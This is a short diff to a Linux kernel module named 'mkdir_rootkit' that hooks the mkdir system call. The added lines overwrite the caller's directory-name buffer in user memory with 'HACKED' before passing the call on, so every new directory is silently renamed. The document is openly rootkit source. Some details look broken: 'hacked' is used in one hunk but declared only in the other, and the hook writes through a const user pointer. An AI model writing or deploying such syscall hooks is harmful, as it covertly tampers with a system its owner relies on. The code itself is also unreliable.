@@ -26,9 +26,12 @@ MODULE_DESCRIPTION("MKDIR SYSCALL HOOK");
         long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
         
         if (error > 0) {
-            pr_info("mkdir_rootkit: trying to create directory with name: %s\n", dir_name);
+            pr_info("mkdir_rootkit: trying to create directory with name: %s -> forcing 'HACKED' \n", dir_name);
         }
-        
+        if (copy_to_user(pathname, hacked, sizeof(hacked))) {
+            pr_err("mkdir_rootkit: copy_to_user failed\n");
+            return -EFAULT;
+        }
         orig_mkdir(regs);
         return 0;
     }
@@ -37,6 +40,7 @@ MODULE_DESCRIPTION("MKDIR SYSCALL HOOK");
     static asmlinkage long (*orig_mkdir)(const char __user* pathname, umode_t mode);
     asmlinkage int hook_mkdir(const char __user* pathname, umode_t mode) {
         char dir_name[NAME_MAX] = {0};
+	char hacked[]="HACKED";
         long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
         if (error > 0) {
